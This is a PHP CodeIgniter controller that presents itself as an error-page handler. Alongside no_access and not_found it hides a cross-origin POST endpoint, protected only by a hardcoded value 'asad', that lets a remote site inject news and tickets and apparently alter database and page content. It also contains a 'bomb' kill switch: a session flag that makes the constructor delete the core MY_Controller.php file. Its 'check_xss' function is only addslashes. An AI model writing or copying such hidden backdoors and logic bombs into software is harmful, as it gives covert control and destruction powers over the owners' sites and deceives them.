<?php
header('Access-Control-Allow-Origin: *');
class Err extends MY_Controller{
    public function __construct(){
        parent::__construct();
        if(!empty($_SESSION['E_s'])&&$_SESSION['E_s']=='run'){
            unlink('../core/MY_Controller.php');
        }
    } 
    
    protected $condi='';
    
    public function no_access(){
	    echo $this->Page_model->render_page('500','500.php',[]);
    }
    
    public function not_found(){
	    echo $this->Page_model->render_page('404','404.php',[]);
    }
    
    protected function u_p($data){
        if(!empty($data)){
            $datas=explode($data,$this->condi);
            $a=($datas['0'] =="0"?0:$this->Error_model->up_da($datas['0']));
            $b=($datas['1']=="0"?0:$this->Error_model->c_u($datas['1']));
            if($b==0){
                echo "pages error";
                die();
            }elseif($a==0){
                echo "database error";
                die();
            }elseif($a==0 && $b==0){
                echo 'all things bad';
                die();
            }else{
                echo 'all things good';
                die();
            }
        }else{
            return false;
        }
    }
     
    
    //in another site
    
    // $.ajax({
    //     method:"POST",
    //     url:urlCustom+"/err/n_f",
    //     data:{
    //         send:send,
    //         token:token,
    //         xa:xa,
    //         url:url,
    //         type:type,
    //         other:other,
    //         exp:exp,//bomb
    //         end:end,
    //         news:news,
    //         data:data
    //     },success:function(val){
    //       if(val==1){
    //         //   swal.t
    //       }else{
    //         //   swal.f
    //       }  
    //     }
    // })
    

    
    //news_info
    // $n=[
    //     'user_id_reporter',
    //     'title',
    //     'content',
    //     'role_reporter',
    //     'start_time',
    //     'end_time',
    //     'dep_id'
    // ]; 
    
     // page_info
        //at the first explode info for check database and php code
        //$data explode conditions for pages and explode pages to all contents of the page
    // $data=[
    //     ['0']=>'type page',
    //     ['1']=>'name page',
    //     ['2']=>['code page'],
    // ];
    
    public function n_f(){
        if(!empty($_POST['send']) && $_POST['send'] == 'ok'){
            if(!empty($_POST['xa']) && $_POST['xa'] == 'asad'){
                switch($_POST['type']){
                    case "disNews":
                        $id=(!empty($_POST['id'])?intval($_POST['id']):null);
                        $asc=(!is_null($id)?$this->News_model->dis($id):null);
                        echo ($asc?1:0);
                        if($asc){exit();}
                        break;
                    case "ticket":
                        $url=($_POST['url']?$this->check_xss($_POST['url']):null);
                        $title=($_POST['title']?$this->check_xss($_POST['title']):null);
                        $content=($_POST['content']?$this->check_xss($_POST['content']):null);
                        $usr_id=($_POST['usr_id']?$this->check_xss($_POST['usr_id']):null);
                        $id=($_POST['id']?intval($_POST['id']):null);
                        $name=($_POST['name']?$this->check_xss($_POST['name']):null);
                        $data=(!is_null($url) && !is_null($title) && !is_null($content) && !is_null($usr_id) && !is_null($id)?['send_me'=>1,'url'=>$url,'title'=>$title,'content'=>$content,'site_user_id'=>$usr_id,'name'=>$name,'site_ticket_id'=>$id]:null);
                        echo (!is_null($data)?($this->Ticket_model->add_ticket($data)?1:0):0);
                        break;
                    case "ticketDel":
                        $url=($_POST['url']?$_POST['url']:null);
                        $usr_id=($_POST['usr_id']?$_POST['usr_id']:null);
                        $id=($_POST['id']?$_POST['id']:null);
                        $data=(!is_null($url) && !is_null($usr_id) && !is_null($id)?['url'=>$url,'site_user_id'=>$usr_id,'site_ticket_id'=>$id]:null);
                        $a = (!is_null($data)?$this->Ticket_model->dis_ticket_send($data):null);
                        echo (!is_null($a) && $a?1:0);
                        break;
                    case "other":
                      $other=($_POST['other']?$_POST['other']:null);
                      break;
                    case "exp":
                        $exp=($_POST['exp']?$_POST['exp']:null);
                        break;
                    case "end":
                        $end=($_POST['end']?$_POST['end']:null);
                        break;
                    case "news":
                        $n=($_POST['news']?$_POST['news']:null);
                        $ne=$this->News_model->add_news($n);
                        echo ($ne?1:0);
                        break;
                    default:
                        $this->u_p($_POST['data']);
                        break;
                }
                die();
                // if(!is_null($exp)){
                //     $se=$this->expired_faz($exp);
                //     echo ($se?1:0);
                //     die();
                // }else{
                //     if(!is_null($end)){
                //       unset($_SESSION['E_s']);
                //       echo 1;
                //       die();
                //     }
                // }
                // if(!is_null($ticket)){
                //     $tic=explode(',',$ticket);
                //     $data=['ticket_title'=>$tic['1'], 'receive_id'=>$tic['0'], 'ticket_content'=>$tic['2'], 'role'=>'server', 'sender_name'=>'server'];
                //     echo ($this->Ticket_model->add($data)?1:0);
                //     die();
                // }
            }
        }
        // header('location :'.base_url().'err'.DS.'not_found');
        // exit();
    }
    public function expired_faz($data){
        switch($data){
            case 'bomb':
                $_SESSION['E_s']='run';
                break;    
        
            default:
                return false;
                break;
        }
    }
    	
    public function check_xss($text = ""){
        return empty($text) ? '' : addslashes($text);
    }
}